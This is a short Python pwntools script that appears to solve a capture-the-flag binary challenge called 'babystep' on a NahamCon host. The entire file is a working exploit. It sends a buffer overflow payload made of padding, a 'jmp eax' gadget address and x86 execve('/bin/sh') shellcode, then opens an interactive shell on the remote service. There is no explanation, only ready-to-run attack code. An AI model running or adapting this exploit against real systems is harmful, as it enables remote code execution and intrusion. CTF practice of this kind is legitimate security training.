#!/usr/bin/env python3
import sys
from pwn import *

conn = remote('challenge.nahamcon.com', 30678)
#conn = process('./babystep')

padding = b"A"*28
address = b"\x45\x95\x04\x08" # ROP gadget (jmp eax --> our shellcode)
shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

payload = padding + address + shellcode

print(conn.recvuntil(b'name?\n'))
conn.sendline(payload)
conn.interactive()
